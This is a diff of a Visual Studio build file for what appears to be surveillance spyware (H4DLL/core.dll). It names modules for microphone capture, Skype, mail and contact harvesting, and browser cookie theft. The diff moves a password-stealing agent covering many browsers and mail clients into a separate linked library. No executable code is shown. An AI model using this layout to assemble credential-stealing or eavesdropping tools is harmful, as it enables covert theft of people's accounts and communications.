@@ -78,7 +78,7 @@
       <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
     </ClCompile>
     <Link>
-      <AdditionalDependencies>$(OutDir)crypto.lib;$(OutDir)json.lib;$(OutDir)clipboard.lib;version.lib;winhttp.lib;WS2_32.lib;shlwapi.lib;Vfw32.lib;oleacc.lib;psapi.lib;Strmiids.lib;gdiplus.lib;Delayimp.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>$(OutDir)crypto.lib;$(OutDir)json.lib;$(OutDir)clipboard.lib;$(OutDir)base64.lib;$(OutDir)pwdagent.lib;version.lib;winhttp.lib;WS2_32.lib;shlwapi.lib;Vfw32.lib;oleacc.lib;psapi.lib;Strmiids.lib;gdiplus.lib;Delayimp.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <OutputFile>$(OutDir)H4DLL.dll</OutputFile>
       <ModuleDefinitionFile>H4-DLL.def</ModuleDefinitionFile>
       <GenerateDebugInformation>true</GenerateDebugInformation>
@@ -109,7 +109,7 @@
       <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
     </ClCompile>
     <Link>
-      <AdditionalDependencies>$(OutDir)crypto.lib;$(OutDir)json.lib;$(OutDir)clipboard.lib;version.lib;winhttp.lib;WS2_32.lib;shlwapi.lib;Vfw32.lib;oleacc.lib;psapi.lib;Strmiids.lib;gdiplus.lib;Delayimp.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>$(OutDir)crypto.lib;$(OutDir)json.lib;$(OutDir)clipboard.lib;$(OutDir)base64.lib;$(OutDir)pwdagent.lib;version.lib;winhttp.lib;WS2_32.lib;shlwapi.lib;Vfw32.lib;oleacc.lib;psapi.lib;Strmiids.lib;gdiplus.lib;Delayimp.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <OutputFile>$(OutDir)core.dll</OutputFile>
       <AdditionalLibraryDirectories>%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
       <ModuleDefinitionFile>H4-DLL.def</ModuleDefinitionFile>
@@ -155,7 +155,6 @@
     <ClCompile Include="SkypeACL\SkypeACL.cpp" />
     <ClCompile Include="SM_ActionFunctions.cpp" />
     <ClCompile Include="SM_Core.cpp" />
-    <ClCompile Include="Social\base64Y.cpp" />
     <ClCompile Include="Social\CookieHandler.cpp" />
     <ClCompile Include="Social\Cookie_Chrome.cpp" />
     <ClCompile Include="Social\Cookie_FireFox.cpp" />
@@ -195,17 +194,6 @@
     <ClCompile Include="HM_MicAgent\QSpeechDetect.cpp" />
     <ClCompile Include="HM_MicAgent\QVistaMicrophone.cpp" />
     <ClCompile Include="HM_MicAgent\XpMic.cpp" />
-    <ClCompile Include="HM_PWDAgent\base64.cpp" />
-    <ClCompile Include="HM_PWDAgent\chrome.cpp" />
-    <ClCompile Include="HM_PWDAgent\firefox.cpp" />
-    <ClCompile Include="HM_PWDAgent\gtalk.cpp" />
-    <ClCompile Include="HM_PWDAgent\iexplorer.cpp" />
-    <ClCompile Include="HM_PWDAgent\msn.cpp" />
-    <ClCompile Include="HM_PWDAgent\opera.cpp" />
-    <ClCompile Include="HM_PWDAgent\outlook.cpp" />
-    <ClCompile Include="HM_PWDAgent\paltalk.cpp" />
-    <ClCompile Include="HM_PWDAgent\thunderbird.cpp" />
-    <ClCompile Include="HM_PWDAgent\trillian.cpp" />
     <ClCompile Include="HM_MailAgent\OLMAPI.cpp" />
     <ClCompile Include="HM_MailAgent\WindowsMail.cpp" />
     <ClCompile Include="HM_ContactAgent\OLABMAPI.cpp" />
